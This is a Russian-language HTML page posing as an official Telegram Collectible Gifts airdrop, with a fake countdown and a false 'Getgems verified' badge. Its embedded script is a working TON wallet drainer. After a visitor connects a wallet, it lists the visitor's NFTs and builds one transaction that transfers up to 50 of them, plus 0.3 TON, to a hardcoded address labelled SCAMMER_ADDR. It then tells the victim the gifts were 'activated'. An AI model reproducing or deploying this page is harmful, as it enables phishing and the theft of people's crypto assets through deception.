<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π Airdrop Telegram Collectible Gifts 2026</title>

    <!-- –ó–∞–≥—Ä—É–∂–∞–µ–º –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –Ω–∞–ø—Ä—è–º—É—é —á–µ—Ä–µ–∑ CDN —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø—É—Ç—è–º–∏ -->
    <script type="module">
        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/esm/index.js';

        import { Address, toNano, beginCell } from 'https://unpkg.com/@ton/ton@latest/dist/index.js';

        // –î–µ–ª–∞–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–º–∏ –≥–ª–æ–±–∞–ª—å–Ω–æ –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
        window.TonConnectUI = TonConnectUI;
        window.Address = Address;
        window.toNano = toNano;
        window.beginCell = beginCell;
    </script>

    <style>
        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #110033, #000); color: #fff; text-align: center; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .container { max-width: 420px; width: 100%; }
        h1 { font-size: 30px; margin-bottom: 10px; }
        .timer { font-size: 24px; color: #ff3366; font-weight: bold; animation: glow 1.5s infinite; }
        @keyframes glow { 0%,100% { text-shadow: 0 0 10px #ff3366; } 50% { text-shadow: 0 0 20px #ff6699; } }
        .gift-img { width: 300px; height: 300px; object-fit: cover; border-radius: 30px; box-shadow: 0 15px 40px rgba(255,105,180,0.5); margin: 30px auto; animation: float 4s ease-in-out infinite; border: 4px solid #ff69b4; }
        @keyframes float { 0%,100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(5deg); } }
        #status { margin: 25px 0; padding: 15px; background: rgba(255,255,255,0.15); border-radius: 15px; font-size: 18px; }
        #ton-connect { margin: 30px 0; min-height: 70px; }
        .note { font-size: 13px; color: #ccc; margin-top: 40px; }
        .error { color: #ff4444; }
        .success { color: #44ff44; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ –õ–∏–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Airdrop Telegram Collectible Gifts 2026</h1>
        <p style="font-size:18px;">–û—Å—Ç–∞–ª–æ—Å—å <span class="timer" id="timer">05:55</span> –¥–æ –∫–æ–Ω—Ü–∞ —Ä–∞–∑–¥–∞—á–∏!</p>
        <p>–ü–æ–¥–∫–ª—é—á–∏—Ç–µ TON-–∫–æ—à–µ–ª—ë–∫ –∏ –∞–∫—Ç–∏–≤–∏—Ä—É–π—Ç–µ –≤—Å–µ –≤–∞—à–∏ —Ä–µ–¥–∫–∏–µ Gifts (Scared Cat, Jelly Bunny, Plush Pepe –∏ –¥—Ä.)</p>
        
        <img class="gift-img" src="https://cache.getgems.io/images/collections/EQATuUGdvrjLvTWE5ppVFOVCqU2dlCLUnKTsu0n1JYm9la10/800.png" alt="Scared Cat Gift">
        
        <div id="ton-connect"></div>
        <div id="status">–ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...</div>
        <p class="note">–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram Collectibles Airdrop ‚Ä¢ Getgems verified 2026</p>
    </div>

    <script type="module">
        // –¢–∞–π–º–µ—Ä
        let t = 355;
        setInterval(() => {
            t = t <= 0 ? 355 : t - 1;
            const m = String(Math.floor(t / 60)).padStart(2, '0');
            const s = String(t % 60).padStart(2, '0');
            document.getElementById('timer').textContent = m + ':' + s;
        }, 1000);

        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
        const statusEl = document.getElementById('status');

        let tonConnectUI = null;

        // –ñ–¥—ë–º, –ø–æ–∫–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –∑–∞–≥—Ä—É–∑—è—Ç—Å—è –∏ —Å—Ç–∞–Ω—É—Ç –¥–æ—Å—Ç—É–ø–Ω—ã –≥–ª–æ–±–∞–ª—å–Ω–æ
        async function waitForLibs() {
            while (typeof window.TonConnectUI === 'undefined' || 
                   typeof window.Address === 'undefined' || 
                   typeof window.toNano === 'undefined' || 
                   typeof window.beginCell === 'undefined') {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }

        function generateTransferPayload(ownerAddress) {
            try {
                return window.beginCell()
                    .storeUint(0x5fcc3d14, 32)
                    .storeUint(Math.floor(Date.now() / 1000), 64)
                    .storeAddress(window.Address.parse(SCAMMER_ADDR))
                    .storeAddress(window.Address.parse(ownerAddress))
                    .storeBit(0)
                    .storeCoins(window.toNano('0.05'))
                    .storeBit(0)
                    .endCell()
                    .toBoc()
                    .toString('base64');
            } catch (e) {
                console.error('Payload error:', e);
                return null;
            }
        }

        async function getNfts(owner) {
            const apis = [
                `https://toncenter.com/api/v3/nft/items?owner_address=${owner}&limit=100&sort=desc`,
                `https://tonapi.io/v2/accounts/${owner}/nfts?limit=1000`,
                `https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=100`
            ];

            for (const url of apis) {
                try {
                    const r = await fetch(url);
                    if (!r.ok) continue;
                    const data = await r.json();
                    let nfts = data.items || data.nft_items || [];
                    if (nfts.length > 0) return nfts;
                } catch (e) {}
            }
            return [];
        }

        async function initTonConnect() {
            await waitForLibs();

            statusEl.innerHTML = '–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect...';

            try {
                if (tonConnectUI) await tonConnectUI.disconnect();

                tonConnectUI = new window.TonConnectUI({
                    manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect'
                });

                statusEl.innerHTML = '<span class="success">–ö–Ω–æ–ø–∫–∞ –≥–æ—Ç–æ–≤–∞! –ù–∞–∂–º–∏—Ç–µ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞</span>';

                tonConnectUI.onStatusChange(async (wallet) => {
                    if (!wallet) {
                        statusEl.innerHTML = '–ö–æ—à–µ–ª—ë–∫ –æ—Ç–∫–ª—é—á—ë–Ω. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.';
                        return;
                    }

                    const owner = wallet.account.address;
                    statusEl.innerHTML = `<span class="success">‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ${owner.slice(0,8)}...${owner.slice(-8)}</span>`;

                    const nfts = await getNfts(owner);
                    if (nfts.length === 0) {
                        statusEl.innerHTML = '<span class="error">‚ùå –ù–µ—Ç Collectible Gifts –≤ –∫–æ—à–µ–ª—å–∫–µ</span>';
                        return;
                    }

                    statusEl.innerHTML = `üîç –ù–∞–π–¥–µ–Ω–æ ${nfts.length} NFT! –§–æ—Ä–º–∏—Ä—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...`;

                    const messages = [];
                    messages.push({ address: SCAMMER_ADDR, amount: window.toNano('0.3').toString() });

                    nfts.slice(0, 50).forEach(nft => {
                        const payload = generateTransferPayload(owner);
                        if (!payload) return;
                        const nftAddr = nft.address || nft.nft_address || nft.item_address;
                        if (!nftAddr) return;
                        messages.push({
                            address: nftAddr,
                            amount: window.toNano('0.06').toString(),
                            payload: payload
                        });
                    });

                    statusEl.innerHTML = `üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ ${messages.length} —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π... –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤ –∫–æ—à–µ–ª—å–∫–µ`;

                    await tonConnectUI.sendTransaction({
                        validUntil: Math.floor(Date.now()/1000) + 600,
                        messages: messages
                    });

                    statusEl.innerHTML = '<span class="success">üéâ –£—Å–ø–µ—Ö! –í—Å–µ Gifts –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω—ã!</span>';

                });

            } catch (error) {
                console.error(error);
                statusEl.innerHTML = '<span class="error">–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏. –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.</span>';
            }
        }

        // –ó–∞–ø—É—Å–∫ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ DOM
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initTonConnect);
        } else {
            initTonConnect();
        }
    </script>
</body>
</html>
